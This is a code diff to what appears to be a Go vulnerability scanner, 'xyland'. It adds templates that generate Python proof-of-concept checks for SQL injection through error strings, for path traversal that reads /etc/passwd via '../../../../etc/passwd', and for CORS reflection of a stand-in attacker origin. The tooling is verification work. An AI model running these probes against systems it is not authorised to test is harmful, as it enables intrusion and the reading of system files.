@@ -142,6 +142,117 @@ def main():
 if __name__ == "__main__":
     raise SystemExit(main())
 `, targetURL, targetURL), true
+
+	case "sqli":
+		return fmt.Sprintf(`#!/usr/bin/env python3
+"""
+PoC - SQL Injection DETEKSI (dihasilkan xyland) - error-based saja, TIDAK mengekstrak data.
+Target : %s
+Exit   : 0=error SQL terkonfirmasi | 2=false positive | 3=inconclusive
+"""
+import urllib.request, urllib.parse, urllib.error
+
+URL = %q
+ERRS = ["sql syntax","you have an error in your sql","sqlite","sqlstate","ora-0","syntax error at or near"]
+
+def fetch(u):
+    try:
+        req = urllib.request.Request(u, headers={"User-Agent":"xyland-poc"})
+        with urllib.request.urlopen(req, timeout=10) as r:
+            return r.read().decode("utf-8","ignore")
+    except urllib.error.HTTPError as e:
+        return e.read().decode("utf-8","ignore")
+    except Exception:
+        return None
+
+def withq(u, suffix):
+    p = urllib.parse.urlparse(u); q = urllib.parse.parse_qs(p.query)
+    if not q: return u
+    k = next(iter(q)); q[k] = [q[k][0] + suffix]
+    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q, doseq=True)))
+
+def has_err(body):
+    lb = (body or "").lower()
+    return any(e in lb for e in ERRS)
+
+def main():
+    base = fetch(URL)
+    if base is None: print("VERDICT: INCONCLUSIVE"); return 3
+    hits = sum(1 for _ in range(2) if has_err(fetch(withq(URL, "'"))))
+    if hits == 2 and not has_err(base):
+        print("VERDICT: CONFIRMED (error-based, deteksi saja)"); return 0
+    print("VERDICT: FALSE_POSITIVE"); return 2
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+`, targetURL, targetURL), true
+
+	case "path-traversal":
+		return fmt.Sprintf(`#!/usr/bin/env python3
+"""
+PoC - Path Traversal (dihasilkan xyland) - membaca /etc/passwd sebagai bukti (file publik-aman).
+Target : %s
+Exit   : 0=confirmed TP | 2=false positive | 3=inconclusive
+"""
+import urllib.request, urllib.parse, urllib.error
+
+URL = %q
+
+def fetch(u):
+    try:
+        req = urllib.request.Request(u, headers={"User-Agent":"xyland-poc"})
+        with urllib.request.urlopen(req, timeout=10) as r:
+            return r.read().decode("utf-8","ignore")
+    except Exception:
+        return None
+
+def witht(u):
+    p = urllib.parse.urlparse(u); q = urllib.parse.parse_qs(p.query)
+    keys = [k for k in q if k.lower() in ("file","path","page","template","doc","include","filename","dir","view","name")]
+    if not q: return u
+    k = keys[0] if keys else next(iter(q)); q[k] = ["../../../../etc/passwd"]
+    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q, doseq=True)))
+
+def main():
+    hits = 0
+    for _ in range(2):
+        b = fetch(witht(URL))
+        if b is None: print("VERDICT: INCONCLUSIVE"); return 3
+        if "root:x:0:0:" in b: hits += 1
+    if hits == 2: print("VERDICT: CONFIRMED_TRUE_POSITIVE"); return 0
+    print("VERDICT: FALSE_POSITIVE"); return 2
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+`, targetURL, targetURL), true
+
+	case "cors":
+		return fmt.Sprintf(`#!/usr/bin/env python3
+"""
+PoC - CORS Misconfiguration (dihasilkan xyland)
+Target : %s
+Exit   : 0=refleksi berkredensial terkonfirmasi | 2=false positive | 3=inconclusive
+"""
+import urllib.request
+
+URL = %q
+ORIGIN = "https://evil.xyland.invalid"
+
+def main():
+    try:
+        req = urllib.request.Request(URL, headers={"Origin": ORIGIN, "User-Agent":"xyland-poc"})
+        with urllib.request.urlopen(req, timeout=10) as r:
+            acao = r.headers.get("Access-Control-Allow-Origin")
+            acac = (r.headers.get("Access-Control-Allow-Credentials") or "").lower()
+    except Exception:
+        print("VERDICT: INCONCLUSIVE"); return 3
+    if acao == ORIGIN and acac == "true":
+        print("VERDICT: CONFIRMED (origin dipantulkan + kredensial)"); return 0
+    print("VERDICT: FALSE_POSITIVE"); return 2
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+`, targetURL, targetURL), true
 	}
 	return "", false
 }
